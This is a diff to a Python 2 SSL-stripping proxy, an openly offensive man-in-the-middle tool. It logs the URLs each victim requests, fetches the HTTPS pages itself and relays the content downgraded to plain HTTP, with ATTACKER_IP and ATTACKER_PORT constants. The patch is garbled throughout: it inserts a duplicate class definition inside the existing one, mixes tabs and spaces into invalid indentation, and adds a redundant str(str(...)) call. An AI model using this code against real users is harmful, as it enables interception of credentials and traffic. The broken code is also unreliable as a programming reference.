@@ -165,10 +165,17 @@ class SSLStripProxy(BaseHTTPRequestHandler):
     def __init__(self, request, client_address, server):
         BaseHTTPRequestHandler.__init__(self, request, client_address, server)
 
-    def do_GET(self):
-        host = self.headers.getheader('Host', '')
-        url = "https://{}{}".format(host, self.path)
-        print "[+] Victim requested:", url
+ATTACKER_IP = "0.0.0.0"
+ATTACKER_PORT = 8080
+
+class SSLStripProxy(BaseHTTPRequestHandler):
+	def __init__(self, request, client_address, server):
+		BaseHTTPRequestHandler.__init__(self, request, client_address, server)
+	
+	    def do_GET(self):
+    		host = self.headers.getheader('Host', '')
+    		url = "https://{}{}".format(host, self.path)
+    		print "[+] Victim requested:", url
 
         try:
             parsed = urlparse.urlparse(url)
@@ -178,22 +185,24 @@ class SSLStripProxy(BaseHTTPRequestHandler):
             if parsed.query:
                 path += "?" + parsed.query
 
-            headers = {
-                "User-Agent": "Mozilla/5.0",
-                "Accept": "*/*",
-                "Accept-Encoding": "identity",  # Request no compression
-                "Host": host
-            }
+			# Tell server not to gzip so easier to handle
+			headers = {
+				"User-Agent": "Mozilla/5.0",
+				"Accept": "*/*",
+				"Accept-Encoding": "identity",  # Request no compression
+				"Host": host
+			}
 
-            conn.request("GET", path, headers=headers)
-            resp = conn.getresponse()
-            content = resp.read()
-            content_encoding = resp.getheader('Content-Encoding', '')
+			conn.request("GET", path, headers=headers)
+			resp = conn.getresponse()
+			content = resp.read()
+			content_encoding = resp.getheader('Content-Encoding', '')
 
-            if content_encoding == 'gzip':
-                buf = StringIO(content)
-                f = gzip.GzipFile(fileobj=buf)
-                content = f.read()
+			# If gzip, decompress before sending to victim
+			if content_encoding == 'gzip':
+				buf = StringIO(content)
+				f = gzip.GzipFile(fileobj=buf)
+				content = f.read()
 
             self.send_response(resp.status)
             content_type = resp.getheader('Content-Type', 'text/html')
@@ -210,8 +219,8 @@ class SSLStripProxy(BaseHTTPRequestHandler):
                 else:
                     raise
 
-        except Exception as e:
-            self.send_error(502, "SSLStrip failed: {}".format(e))
+    		except Exception as e:
+    			self.send_error(502, "SSLStrip failed: {}".format(e))
 
     def do_HEAD(self):
         host = self.headers.getheader('Host', '')
@@ -248,6 +257,6 @@ class SSLStripProxy(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    print "[*] Starting SSLStrip proxy on port " + str(ATTACKER_PORT)
+    print "[*] Starting SSLStrip proxy on port " + str(str(ATTACKER_PORT))
     httpd = HTTPServer((ATTACKER_IP, ATTACKER_PORT), SSLStripProxy)
     httpd.serve_forever()
